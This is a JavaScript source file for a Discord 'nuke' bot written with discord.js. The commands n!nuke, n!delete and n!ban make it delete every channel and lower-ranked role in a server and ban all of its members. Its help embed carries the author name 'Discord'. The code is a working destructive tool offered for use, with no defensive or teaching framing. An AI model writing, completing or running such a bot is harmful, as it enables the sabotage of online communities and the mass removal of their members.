const discord = require("discord.js");
const nuke = new discord.Client();


nuke.on("ready", () => {
    console.log(`${nuke.user.tag} is online.`);
    nuke.user.setActivity("B)")
});

nuke.on("message", (msg) => {



    if (msg.content.toLowerCase().startsWith("n!" + "nuke")) {
        msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
        msg.guild.channels.deleteAll();
        msg.guild.members.tap(member => member.ban("reason"));
    }
    if (msg.content.toLowerCase().startsWith("n!" + "delete")) {
        msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
        msg.guild.channels.deleteAll();
    }
    if (msg.content.toLowerCase().startsWith("n!" + "ban")) {

        msg.guild.members.forEach(m => {
            m.ban("reason")
        })
    }
    if (msg.content.toLowerCase().startsWith("n!" + "help")) {
        msg.author.send({
            embed: {
                color: 0xff0000,
                author: { name: "Discord" },
                description: "n!nuke - Bans all members & deletes all roles and channels\n n!delete - Deletes all channels and roles\n n!ban - Bans all members in the discord\n\nFor any help contact sx"
            }
        })
    }
});

nuke.login("token");